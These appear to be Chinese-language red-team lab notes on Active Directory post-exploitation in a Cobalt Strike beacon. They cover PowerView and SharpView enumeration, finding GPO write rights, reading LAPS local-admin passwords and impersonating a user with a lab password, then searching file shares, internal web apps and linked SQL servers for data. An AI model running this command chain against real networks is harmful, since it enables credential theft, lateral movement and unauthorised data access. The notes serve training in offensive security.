
域枚举

# PowerView

引入PowerView,注意这一节使用的是开发版的PS
```
beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
```

# Get-Domain

获取当前域
```
beacon> powershell Get-Domain
```

# Get-DomainController
获取DC

```
beacon> powershell Get-DomainController | select Forest, Name, OSVersion | fl
```

# Get-ForestDomain

获取当前林
```
beacon> powershell Get-ForestDomain
```

# Get-DomainPolicyData

返回当前域或指定域/域控制器的默认域策略或域控制器策略。对于查找诸如域密码策略之类的信息很有用。
```
beacon> powershell Get-DomainPolicyData | select -ExpandProperty SystemAccess

MinimumPasswordAge           : 1
MaximumPasswordAge           : 42
MinimumPasswordLength        : 7
PasswordComplexity           : 1
PasswordHistorySize          : 24
LockoutBadCount              : 0
RequireLogonToChangePassword : 0
ForceLogoffWhenHourExpire    : 0
ClearTextPassword            : 0
LSAAnonymousNameLookup       : 0
```

# Get-DomainUser

返回所有（或特定）用户。要仅返回特定属性，请使用-Properties. 默认情况下，返回当前域的所有用户对象，用于-Identity返回特定用户。

```
beacon> powershell Get-DomainUser -Identity nlamb -Properties DisplayName, MemberOf | fl

displayname : Nina Lamb
memberof    : {CN=Roaming Users,CN=Users,DC=dev,DC=cyberbotic,DC=io, CN=Group Policy Creator 
              Owners,CN=Users,DC=dev,DC=cyberbotic,DC=io, CN=Domain Admins,CN=Users,DC=dev,DC=cyberbotic,DC=io, 
              CN=Administrators,CN=Builtin,DC=dev,DC=cyberbotic,DC=io}
```

# Get-DomainComputer

获取域内所有计算机
```
beacon> powershell Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName
```

# Get-DomainOU

搜索所有organization units(OU) 或特定 OU 对象

```
beacon> powershell Get-DomainOU -Properties Name | sort -Property Name

name              
----              
Domain Controllers
Servers           
Tier 1            
Tier 2            
Workstations
```

# Get-DomainGroup

获取域内所有的组信息
```
beacon> powershell Get-DomainGroup
```

获取所有带```admin```字样的组信息
```
beacon> powershell Get-DomainGroup | where Name -like "*Admins*" | select SamAccountName

samaccountname
--------------
Domain Admins 
Key Admins    
DnsAdmins     
Oracle Admins 
```

# Get-DomainGroupMember

返回特定的组成员信息，这里是返回DA组
```
beacon> powershell Get-DomainGroupMember -Identity "Domain Admins" | select MemberDistinguishedName

MemberDistinguishedName                             
-----------------------                             
CN=Nina Lamb,CN=Users,DC=dev,DC=cyberbotic,DC=io    
CN=Administrator,CN=Users,DC=dev,DC=cyberbotic,DC=io
```

# Get-DomainGPO

返回所有组策略对象 (GPO) 或特定 GPO 对象。要枚举应用于特定机器的所有 GPO，请使用```-ComputerIdentity```

```
beacon> powershell Get-DomainGPO -Properties DisplayName | sort -Property DisplayName

displayname                      
-----------                      
Default Domain Controllers Policy
Default Domain Policy
Roaming Users
Tier 1 Admins
Tier 2 Admins
Windows Defender
Windows Firewall
```


```
beacon> powershell Get-DomainGPO -ComputerIdentity wkstn-1 -Properties DisplayName | sort -Property DisplayName

displayname          
-----------          
Default Domain Policy
LAPS
PowerShell Logging
Roaming Users
Windows Defender
Windows Firewall
```

# Get-DomainGPOLocalGroup

返回所有通过受限组或组策略首选项修改本地组成员资格的GPO。
```
beacon> powershell Get-DomainGPOLocalGroup | select GPODisplayName, GroupName

GPODisplayName GroupName           
-------------- ---------           
Tier 1 Admins  DEV\Developers      
Tier 2 Admins  DEV\1st Line Support
```

# Get-DomainGPOUserLocalGroupMapping

枚举特定域用户/组是特定本地组成员的机器。

```
beacon> powershell Get-DomainGPOUserLocalGroupMapping -LocalGroup Administrators | select ObjectName, GPODisplayName, ContainerName, ComputerName

ObjectName       GPODisplayName ContainerName                                     ComputerName             
----------       -------------- -------------                                     ------------             
1st Line Support Tier 2 Admins  {OU=Tier 2,OU=Servers,DC=dev,DC=cyberbotic,DC=io} {srv-2.dev.cyberbotic.io}
Developers       Tier 1 Admins  {OU=Tier 1,OU=Servers,DC=dev,DC=cyberbotic,DC=io} {srv-1.dev.cyberbotic.io}
```

# Find-DomainUserLocation

查找域用户（默认是DA）登录过的机器
```
beacon> powershell Find-DomainUserLocation | select UserName, SessionFromName

UserName      SessionFromName          
--------      ---------------          
nlamb         wkstn-2.dev.cyberbotic.io
```


# Get-NetSession

返回本地（或远程）机器的会话信息（其中CName是源IP）
```
beacon> powershell Get-NetSession -ComputerName dc-2 | select CName, UserName

CName          UserName
-----          --------
\\10.10.17.231 bfarmer 
\\10.10.17.132 nlamb   
```

# Get-DomainTrust

枚举域信任关系
```
beacon> powershell Get-DomainTrust
```

# [SharpView](https://github.com/tevora-threat/SharpView)

C#版本的powerview

使用SharpView枚举当前域
```
beacon> execute-assembly C:\Tools\SharpView\SharpView\bin\Debug\SharpView.exe Get-Domain

Forest                         : cyberbotic.io
DomainControllers              : {dc-2.dev.cyberbotic.io}
Children                       : {}
DomainMode                     : Unknown
DomainModeLevel                : 7
Parent                         : cyberbotic.io
PdcRoleOwner                   : dc-2.dev.cyberbotic.io
RidRoleOwner                   : dc-2.dev.cyberbotic.io
InfrastructureRoleOwner        : dc-2.dev.cyberbotic.io
Name                           : dev.cyberbotic.io
```

# [ADSearch](https://github.com/tomcarver16/ADSearch)

功能比powerview和shapview少一些，但是有强大的LDAP 查询功能

查找所有以```admins```结尾的域用户组
```
beacon> execute-assembly C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search "(&(objectCategory=group)(cn=*Admins))"

[*] No domain supplied. This PC's domain will be used instead
[*] LDAP://DC=dev,DC=cyberbotic,DC=io
[*] CUSTOM SEARCH: 
[*] TOTAL NUMBER OF SEARCH RESULTS: 6
[+] cn : Domain Admins
[+] cn : Key Admins
[+] cn : DnsAdmins
[+] cn : Oracle Admins
[+] cn : Subsidiary Admins
[+] cn : MS SQL Admins
```


# GPO
枚举能过创建GPO的SID
然后通过```ConvertFrom-SID```命令查找这个SID是哪个组下的
```
beacon> powershell Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl

ObjectDN              : CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io
ActiveDirectoryRights : CreateChild
SecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1125

beacon> powershell ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1125

DEV\1st Line Support
```


This query will return the principals that can write to the GP-Link attribute on OUs:
```
beacon> powershell Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl

ObjectDN           : OU=Workstations,DC=dev,DC=cyberbotic,DC=io
SecurityIdentifier : S-1-5-21-3263068140-2042698922-2891547269-1125

ObjectDN           : OU=Servers,DC=dev,DC=cyberbotic,DC=io
SecurityIdentifier : S-1-5-21-3263068140-2042698922-2891547269-1125

ObjectDN           : OU=Tier 1,OU=Servers,DC=dev,DC=cyberbotic,DC=io
SecurityIdentifier : S-1-5-21-3263068140-2042698922-2891547269-1125

ObjectDN           : OU=Tier 2,OU=Servers,DC=dev,DC=cyberbotic,DC=io
SecurityIdentifier : S-1-5-21-3263068140-2042698922-2891547269-1125
```

从上面的输出可以看到，```1st Line Support```域组既可以创建新的 GPO ，也可以将它们链接到多个 OU。
 如果更多的特权用户被认证到这些OU内的任何机器上，这可能导致特权升级。还可以想象一下，如果我们可以将GPO链接到包含敏感文件或数据库服务器的OU上--我们可以使用这些GPO来访问这些机器，随后访问存储在这些机器上的数据。



获取某个OU的计算机列表
```
beacon> powershell Get-DomainComputer | ? { $_.DistinguishedName -match "OU=Tier 1" } | select DnsHostName

dnshostname            
-----------            
srv-1.dev.cyberbotic.io
```


下面查询返回所有拥有WriteProperty、WriteDacl或WriteOwner权限的SID
```
beacon> powershell Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|WriteDacl|WriteOwner" -and $_.SecurityIdentifier -match "S-1-5-21-3263068140-2042698922-2891547269-[\d]{4,10}" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl

ObjectDN              : CN={AD7EE1ED-CDC8-4994-AE0F-50BA8B264829},CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io
ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, GenericExecute
SecurityIdentifier    : S-1-5-21-3263068140-2042698922-2891547269-1126

beacon> powershell ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1126
DEV\Developers
```

查看上面结果中ObjectDN的名字
```
beacon> powershell Get-DomainGPO -Name "{AD7EE1ED-CDC8-4994-AE0F-50BA8B264829}" -Properties DisplayName

displayname       
-----------       
PowerShell Logging
```

# Local Administrator Password Solution


有几种方法可以寻找 LAPS 的存在。如果 LAPS 应用于您有权访问的计算机，则AdmPwd.dll将在磁盘上

```
beacon> run hostname
wkstn-1

beacon> ls C:\Program Files\LAPS\CSE

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 145kb    fil     09/22/2016 08:02:08   AdmPwd.dll
```

查找名称中包含“LAPS”或其他一些描述性术语的 GPO
```
beacon> powershell Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl

displayname    : LAPS
name           : {4A8A4E8E-929F-401A-95BD-A7D40E0976C8}
gpcfilesyspath : \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}
```

搜索```ms-Mcs-AdmPwdExpirationTime```属性不为空的计算机对象（任何域用户都可以读取此属性）
```
beacon> powershell Get-DomainObject -SearchBase "LDAP://DC=dev,DC=cyberbotic,DC=io" | ? { $_."ms-mcs-admpwdexpirationtime" -ne $null } | select DnsHostname

dnshostname              
-----------              
wkstn-1.dev.cyberbotic.io
wkstn-2.dev.cyberbotic.io
```

如果我们能找到正确的GPO，我们可以从```gpcfilesyspath```下载LAPS的配置文件
```
beacon> ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     03/16/2021 16:59:45   Scripts
 575b     fil     03/16/2021 17:11:46   comment.cmtx
 740b     fil     03/16/2021 17:11:46   Registry.pol

beacon> download \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol
[*] started download of \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{4A8A4E8E-929F-401A-95BD-A7D40E0976C8}\Machine\Registry.pol (740 bytes)
[*] download of Registry.pol is complete
```
## GPRegistryPolicyParser
[GPRegistryPolicyParser](https://github.com/PowerShell/GPRegistryPolicyParser)这个工具里的```Parse-PolFile```方法可以把上面的配置文件转成人类可读的格式
```
PS C:\Users\Administrator\Desktop> Parse-PolFile .\Registry.pol

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : PasswordComplexity
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 3    <-- Password contains uppers, lowers and numbers (4 would also include specials)

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : PasswordLength
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 14   <-- Password length is 14

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : PasswordAgeDays
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 7    <-- Password is changed every 7 days

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : AdminAccountName
ValueType   : REG_SZ
ValueLength : 14
ValueData   : lapsadmin   <-- The name of the local admin account to manage

KeyName     : Software\Policies\Microsoft Services\AdmPwd
ValueName   : AdmPwdEnabled
ValueType   : REG_DWORD
ValueLength : 4
ValueData   : 1   <-- LAPS is enabled
```

BloodHound 里等价查询应用了 LAPS 的计算机的方法
```
MATCH (c:Computer {haslaps: true}) RETURN c
```

BloodHound 里等价查询所有通过LAPS对域机器有特殊权限的组
```
MATCH p=(g:Group)-[:ReadLAPSPassword]->(c:Computer) RETURN p
```

![alt BloodHound](https://rto-assets.s3.eu-west-2.amazonaws.com/laps/bloodhound-readlapspassword.png?width=1920)

如果我们横向的计算机安装了LAPS PowerShell，则可以使用以下方法
```
beacon> powershell Get-Command *AdmPwd*

CommandType     Name                                               Version    Source
-----------     ----                                               -------    ------
Cmdlet          Find-AdmPwdExtendedRights                          5.0.0.0    AdmPwd.PS
Cmdlet          Get-AdmPwdPassword                                 5.0.0.0    AdmPwd.PS
Cmdlet          Reset-AdmPwdPassword                               5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdAuditing                                 5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdComputerSelfPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdReadPasswordPermission                   5.0.0.0    AdmPwd.PS
Cmdlet          Set-AdmPwdResetPasswordPermission                  5.0.0.0    AdmPwd.PS
Cmdlet          Update-AdmPwdADSchema                              5.0.0.0    AdmPwd.PS
```

```Find-AdmPwdExtendedRights```返回允许读取 LAPS password 的所有OU
```
beacon> run hostname
wkstn-2

beacon> getuid
[*] You are DEV\nlamb

beacon> powershell Find-AdmPwdExtendedRights -Identity Workstations | fl

ObjectDN             : OU=Workstations,DC=dev,DC=cyberbotic,DC=io
ExtendedRightHolders : {NT AUTHORITY\SYSTEM, DEV\Domain Admins, DEV\1st Line Support}
```

上面结果表明，可以读取LAPS 密码属性的三个OU是：NT AUTHORITY\SYSTEM，DEV\Domain Admins，DEV\1st Line Support


由于域管理员可以读取所有 LAPS 密码属性,Get-AdmPwdPassword读取指定计算机的密码
```
beacon> powershell Get-AdmPwdPassword -ComputerName wkstn-2 | fl

ComputerName        : WKSTN-2
DistinguishedName   : CN=WKSTN-2,OU=Workstations,DC=dev,DC=cyberbotic,DC=io
Password            : WRSZV43u16qkc1
ExpirationTimestamp : 5/20/2021 12:57:36 PM
```

如果已经是DA，大概不太需要通过这种方式读取到密码，但是从之前的结果可知，```DEV\1st Line Support```这个组的成员也可以读取LAPS 密码属性，因此我们可以通过横向到这个组成员，然后读取需要的密码进行横向或者提权

注意，当前账号```DEV\bfarmer```是没有权限读取LAPS密码的
```
beacon> run hostname
wkstn-1

beacon> getuid
[*] You are DEV\bfarmer

beacon> powershell Get-AdmPwdPassword -ComputerName wkstn-2 | fl

ComputerName        : WKSTN-2
DistinguishedName   : CN=WKSTN-2,OU=Workstations,DC=dev,DC=cyberbotic,DC=io
Password            : 
ExpirationTimestamp : 5/20/2021 12:57:36 PM
```

我们首先横向到一个```DEV\1st Line Support```组成员```DEV\jking```，然后再次读取LAPS密码
```
beacon> make_token DEV\jking Purpl3Drag0n
beacon> powershell Get-AdmPwdPassword -ComputerName wkstn-2 | fl

ComputerName        : WKSTN-2
DistinguishedName   : CN=WKSTN-2,OU=Workstations,DC=dev,DC=cyberbotic,DC=io
Password            : P0OPwa4R64AkbJ
ExpirationTimestamp : 3/23/2021 5:18:43 PM

beacon> rev2self
beacon> make_token .\lapsadmin P0OPwa4R64AkbJ
beacon> ls \\wkstn-2\c$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/19/2021 14:35:19   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     10/18/2016 01:59:39   Documents and Settings
```

## powerview
如果当前账号没有 LAPS cmdlets方法集，powerview的ms-Mcs-AdmPwd和ReadPropery 也可以等价枚举出LAPS密码
```
beacon> powershell Get-DomainObjectAcl -SearchBase "LDAP://OU=Workstations,DC=dev,DC=cyberbotic,DC=io" -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -like "*ReadProperty*" } | select ObjectDN, SecurityIdentifier

ObjectDN                                              SecurityIdentifier
--------                                              ------------------
OU=Workstations,DC=dev,DC=cyberbotic,DC=io            S-1-5-21-3263068140-2042698922-2891547269-1125
CN=WKSTN-1,OU=Workstations,DC=dev,DC=cyberbotic,DC=io S-1-5-21-3263068140-2042698922-2891547269-1125
CN=WKSTN-2,OU=Workstations,DC=dev,DC=cyberbotic,DC=io S-1-5-21-3263068140-2042698922-2891547269-1125

beacon> powershell ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1125
DEV\1st Line Support

beacon> make_token DEV\jking Purpl3Drag0n
beacon> powershell Get-DomainObject -Identity wkstn-2 -Properties ms-Mcs-AdmPwd

ms-mcs-admpwd 
------------- 
P0OPwa4R64AkbJ
```

课本捎带提到了[LAPSToolkit](https://github.com/leoloobeek/LAPSToolkit)这个工具也可以做类似上面的操作



# Data Hunting & Exfiltration

数据通常会存储在共享文件夹、数据库、SharePoint、内部 wiki 等的各种位置.

# File Shares

```Find-DomainShare```查找所有共享目录，加```-CheckShareAccess ```表示可以访问的
```
beacon> powershell Find-DomainShare -ComputerDomain cyberbotic.io -CheckShareAccess

Name     Type Remark              ComputerName      
----     ---- ------              ------------      
data$       0                     dc-1.cyberbotic.io

beacon> ls \\dc-1.cyberbotic.io\data$

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 17kb     fil     03/25/2021 12:54:11   63ec08038c04ac60dab340ee9569e690dataMar-25-2021.xlsx
 214kb    fil     03/25/2021 13:02:53   Apple iPhone 8.ai
 1mb      fil     03/25/2021 13:02:55   Boeing 787-8 DreamLiner Air Canada.ai
 540kb    fil     03/25/2021 13:02:54   Caterpillar 345D L.ai
 829kb    fil     03/25/2021 13:02:55   Ducati 1098R (2011).ai
 895kb    fil     03/25/2021 13:02:55   Volkswagen Caddy Maxi (2020).ai
```

# Internal Web Apps

[EyeWitness](https://github.com/FortyNorthSecurity/EyeWitness)这个工具可以从内部网络应用中截取数据截图等信息，主要用于内部网络应用的信息收集

> EyeWitness 旨在截取网站的屏幕截图，提供一些服务器标头信息，并在已知的情况下识别默认凭据。

> EyeWitness 设计为在 Kali Linux 上运行。它会自动检测您使用 -f 标志提供的文件，作为每个新行上带有 URL 的文本文件、nmap xml 输出或 nessus xml 输出。--timeout 标志是完全可选的，它允许您在尝试呈现和截屏网页时提供最大等待时间。

```
root@kali:/opt/EyeWitness/Python# cat /root/targets.txt
10.10.17.71
10.10.17.25
10.10.17.68

root@kali:/opt/EyeWitness/Python# proxychains4 ./EyeWitness.py --web -f /root/targets.txt -d /root/dev --no-dns --no-prompt

Starting Web Requests (3 Hosts)
Attempting to screenshot http://10.10.17.71
[*] WebDriverError when connecting to http://10.10.17.71
Attempting to screenshot http://10.10.17.25
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.10.17.25:80  ...  OK
Attempting to screenshot http://10.10.17.68
[*] WebDriverError when connecting to http://10.10.17.68
Finished in 12.967030048370361 seconds
```

```
PS C:\Users\Administrator\Desktop> pscp -r root@kali:/root/dev 。
```

![alt alt](https://rto-assets.s3.eu-west-2.amazonaws.com/data-hunting/eyewitness-report.png?width=1920)

# Databases

使用工具：PowerUpSQL

```Get-SQLColumnSampleDataThreaded```在一个或多个实例中搜索列名中包含特定关键字的数据库
```
beacon> powershell Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "project" -SampleSize 5 | select instance, database, column, sample | ft -autosize

Instance                     Database Column      Sample         
--------                     -------- ------      ------         
srv-1.dev.cyberbotic.io,1433 master   ProjectName Mild Sun       
srv-1.dev.cyberbotic.io,1433 master   ProjectName Warm Venus     
srv-1.dev.cyberbotic.io,1433 master   ProjectName Grim Lyric     
srv-1.dev.cyberbotic.io,1433 master   ProjectName Precious Castle
srv-1.dev.cyberbotic.io,1433 master   ProjectName Fine Devil  
```

```Get-SQLQuery```搜索链接
```
beacon> powershell Get-SQLQuery -Instance "srv-1.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select * from information_schema.tables')"

TABLE_CATALOG TABLE_SCHEMA TABLE_NAME            TABLE_TYPE
------------- ------------ ----------            ----------
master        dbo          spt_fallback_db       BASE TABLE
master        dbo          spt_fallback_dev      BASE TABLE
master        dbo          spt_fallback_usg      BASE TABLE
master        dbo          spt_values            VIEW      
master        dbo          spt_monitor           BASE TABLE
master        dbo          MSreplication_options BASE TABLE
master        dbo          VIPClients            BASE TABLE
```

```
beacon> powershell Get-SQLQuery -Instance "srv-1.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select column_name from master.information_schema.columns')"

column_name
-----------
City
Name
OrgNumber
Street
VIPClientsID
```

```
beacon> powershell Get-SQLQuery -Instance "srv-1.dev.cyberbotic.io,1433" -Query "select * from openquery(""sql-1.cyberbotic.io"", 'select top 5 OrgNumber from master.dbo.VIPClients')"

OrgNumber  
---------  
65618655299
69838663099
12289506999
73723428599
51766460299
```